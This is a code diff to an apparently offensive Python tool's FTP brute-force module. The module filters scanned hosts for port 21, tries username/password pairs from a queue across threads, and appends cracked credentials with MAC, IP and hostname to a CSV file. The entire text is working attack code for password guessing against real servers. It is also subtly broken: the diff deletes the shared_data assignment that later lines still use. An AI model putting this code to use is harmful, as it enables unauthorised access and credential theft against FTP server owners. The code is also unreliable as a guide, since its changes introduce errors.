@@ -37,19 +37,24 @@ class FTPBruteforce:
         """
         Executes the brute force attack and updates the shared data status.
         """
-        self.shared_data.bjornorch_status = "FTPBruteforce"
-        # Wait a bit because it's too fast to see the status change
-        time.sleep(5)
-        logger.info(f"Brute forcing FTP on {ip}:{port}...")
-        success, results = self.bruteforce_ftp(ip, port)
-        return 'success' if success else 'failed'
+        try:
+            self.shared_data.bjornorch_status = "FTPBruteforce"
+            time.sleep(5)
+            logger.info(f"Brute forcing FTP on {ip}:{port}...")
+            success, results = self.bruteforce_ftp(ip, port)
+            return 'success' if success else 'failed'
+        except KeyboardInterrupt:
+            logger.info("Bruteforce attack interrupted, cleaning up...")
+            self.shared_data.orchestrator_should_exit = True
+            return 'interrupted'
 
 class FTPConnector:
     """
     This class manages the FTP connection attempts using different usernames and passwords.
     """
     def __init__(self, shared_data):
-        self.shared_data = shared_data
+        # Keep the connection open for reuse during brute-force attempts
+        self.ftp_conn = None
         self.scan = pd.read_csv(shared_data.netkbfile)
 
         if "Ports" not in self.scan.columns:
@@ -65,8 +70,9 @@ class FTPConnector:
             logger.info(f"File {self.ftpfile} does not exist. Creating...")
             with open(self.ftpfile, "w") as f:
                 f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
+
         self.results = []  
-        self.queue = Queue()
+        self.queue = Queue(maxsize=500)  # Initialize the queue here
         self.console = Console()
 
     def load_scan_file(self):
@@ -80,22 +86,21 @@ class FTPConnector:
         self.scan = self.scan[self.scan["Ports"].str.contains("21", na=False)]
 
     def ftp_connect(self, adresse_ip, user, password):
-        """
-        Attempts to connect to the FTP server using the provided username and password.
-        """
+        if not self.ftp_conn:
+            self.ftp_conn = FTP()
+            self.ftp_conn.connect(adresse_ip, 21)
+
         try:
-            conn = FTP()
-            conn.connect(adresse_ip, 21)
-            conn.login(user, password)
-            conn.quit()
+            self.ftp_conn.login(user, password)
             logger.info(f"Access to FTP successful on {adresse_ip} with user '{user}'")
             return True
         except Exception as e:
+            logger.error(f"Failed to connect to {adresse_ip} with user '{user}': {e}")
             return False
 
     def worker(self, progress, task_id, success_flag):
         """
-        Worker thread to process items in the queue.
+        Worker thread to process items in the queue. Limit the number of threads to optimize resources.
         """
         while not self.queue.empty():
             if self.shared_data.orchestrator_should_exit:
@@ -112,6 +117,8 @@ class FTPConnector:
                     success_flag[0] = True
             self.queue.task_done()
             progress.update(task_id, advance=1)
+            
+            time.sleep(0.1)  # Add a small sleep to reduce CPU usage
 
     def run_bruteforce(self, adresse_ip, port):
         self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
@@ -159,7 +166,8 @@ class FTPConnector:
         Saves the results of successful FTP connections to a CSV file.
         """
         df = pd.DataFrame(self.results, columns=['MAC Address', 'IP Address', 'Hostname', 'User', 'Password', 'Port'])
-        df.to_csv(self.ftpfile, index=False, mode='a', header=not os.path.exists(self.ftpfile))
+        with open(self.ftpfile, mode='a', newline='') as f:
+            df.to_csv(f, header=not os.path.exists(self.ftpfile), index=False)
         self.results = []  # Reset temporary results after saving
 
     def removeduplicates(self):
